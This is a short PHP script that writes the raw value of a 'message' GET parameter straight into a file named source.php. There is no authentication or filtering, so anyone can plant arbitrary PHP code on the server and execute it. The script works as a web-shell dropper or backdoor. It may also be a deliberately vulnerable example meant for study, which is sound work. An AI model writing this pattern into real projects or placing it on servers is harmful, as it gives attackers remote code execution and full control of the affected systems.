<?php

$message=$_GET["message"];

$mf=fopen("source.php", "w");

fwrite($mf, $message);
fclose($mf);

?>
